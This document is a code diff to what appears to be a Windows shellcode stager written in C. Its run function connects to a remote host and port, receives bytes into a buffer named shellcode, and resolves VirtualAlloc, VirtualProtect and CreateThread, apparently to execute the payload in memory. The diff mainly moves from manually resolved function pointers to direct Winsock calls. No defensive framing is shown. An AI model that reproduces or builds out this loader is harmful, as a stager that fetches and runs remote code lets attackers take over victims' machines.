@@ -17,11 +17,11 @@
 //#include "stager.h"
 //#include "../utils/utils.h"
 
-//#include <winsock2.h> // needed by socket and connect?
+#include <winsock2.h> // needed by socket and connect?
 #include "../utils/winsock_util.h"
 //#include "payload_util.h"
 #include "../utils/utils.h"
-//#include "../utils/kernel32_util.h"
+#include "../utils/kernel32_util.h"
 
 //#include <stdio.h>
 //#include <stdlib.h>
@@ -30,7 +30,7 @@
 // TODO: GetProcAddress is not working... fix it
 
 
-//#pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "ws2_32.lib")
 
 //bool Stager::run(const std::string& host, const std::string& port)
 int run(const char* host, const char* port)
@@ -45,10 +45,10 @@ int run(const char* host, const char* port)
     FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");
 	FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressManual("kernel32.dll", "WaitForSingleObject");
 	*/
-    FARPROC pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
-    FARPROC pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
-    FARPROC pCreateThread = GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateThread");
-    FARPROC WaitForSingleObject = GetProcAddress(GetModuleHandle("kernel32.dll"), "WaitForSingleObject");
+    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
+    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
+    FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateThread");
+    FuncWaitForSingleObject pWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddress(GetModuleHandle("kernel32.dll"), "WaitForSingleObject");
 
 	/*
     FuncWSAStartup pWSAStartup = (FuncWSAStartup)GetProcAddressManual("ws2_32.dll", "WSAStartup");
@@ -66,13 +66,13 @@ int run(const char* host, const char* port)
 	// printf("1 - Starting\n");
     
     WSADATA wsaData;
-    if (pWSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
+    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
         //std::cout << "WSAStartup failed" << std::endl;
         // printf("WSAStartup failed\n");
         return 1;
     }
 
-    SOCKET sock = pSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) 
 	{
         //std::cout << "socket failed: " << WSAGetLastError() << std::endl;
@@ -94,7 +94,7 @@ int run(const char* host, const char* port)
     hints.ai_protocol = IPPROTO_TCP;
 
     //if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0) 
-    if (pGetAddrInfo(host, port, &hints, &result) != 0) 
+    if (getaddrinfo(host, port, &hints, &result) != 0) 
 	{
         //std::cout << "getaddrinfo failed" << std::endl;
 		// printf("getaddrinfo failed\n");
@@ -121,14 +121,14 @@ int run(const char* host, const char* port)
     ADDRINFOA *ptr = result; // TODO: no need to assign result to ptr just use result?
     while (ptr != NULL)
     {
-        if (pConnect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
+        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0)
         {
             connected = 1;
             break;
         }
         ptr = ptr->ai_next;
     }
-    pFreeAddrInfo(result);
+    freeaddrinfo(result);
 
     if (!connected) 
 	{
@@ -147,7 +147,7 @@ int run(const char* host, const char* port)
 
 	unsigned char shellcode[512];
 	//int bytes_received = recv(sock, (char*)shellcode, sizeof(shellcode), 0);
-	int bytes_received = pRecv(sock, (char*)shellcode, 512, 0);
+	int bytes_received = recv(sock, (char*)shellcode, 512, 0);
     
     if (bytes_received <= 0) 
 	{
@@ -202,8 +202,8 @@ int run(const char* host, const char* port)
 
     //std::cout << "8 - Cleaning up" << std::endl;
     // printf("8 - Cleaning up"); 
-    pCloseSocket(sock);
-    pWSACleanup();
+    closesocket(sock);
+    WSACleanup();
     return 0;
 }
 
